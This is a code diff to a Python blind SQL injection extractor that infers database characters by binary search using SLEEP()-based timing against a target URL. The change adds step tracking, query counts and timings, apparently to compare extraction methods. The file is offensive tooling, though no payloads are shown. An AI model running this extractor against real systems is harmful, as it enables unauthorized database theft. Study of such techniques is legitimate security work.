@@ -14,7 +14,8 @@ class BinarySearchExtractor:
     """Extracts characters using binary search instead of linear search."""
     
     def __init__(self, base_url: str, payload_template: str, 
-                 delay_seconds: float = 2.0, analyzer: Optional[TimingAnalyzer] = None):
+                 delay_seconds: float = 2.0, analyzer: Optional[TimingAnalyzer] = None,
+                 track_steps: bool = False):
         """
         Initialize the extractor.
         
@@ -23,12 +24,16 @@ class BinarySearchExtractor:
             payload_template: SQL injection payload template with {condition} placeholder
             delay_seconds: Base delay to use in SQL SLEEP() functions
             analyzer: TimingAnalyzer instance (creates default if None)
+            track_steps: If True, track all extraction steps for comparison
         """
         self.base_url = base_url
         self.payload_template = payload_template
         self.delay_seconds = delay_seconds
         self.analyzer = analyzer or TimingAnalyzer()
         self.session = requests.Session()
+        self.track_steps = track_steps
+        self.steps: List[dict] = []
+        self.total_queries = 0
         
         # Cache for timing measurements
         self.baseline_cache: Optional[List[float]] = None
@@ -155,7 +160,26 @@ class BinarySearchExtractor:
             
             # Test if character >= mid
             condition = f"{char_query} >= {mid}"
-            if self._test_condition(condition):
+            
+            start_time = time.time()
+            test_result = self._test_condition(condition)
+            elapsed = time.time() - start_time
+            self.total_queries += 1
+            
+            # Track step if enabled
+            if self.track_steps:
+                self.steps.append({
+                    'position': position,
+                    'low': low,
+                    'high': high,
+                    'mid': mid,
+                    'condition': condition,
+                    'result': test_result,
+                    'timing': elapsed,
+                    'queries': self.total_queries
+                })
+            
+            if test_result:
                 # Character is >= mid, so search in upper half
                 low = mid + 1
             else:
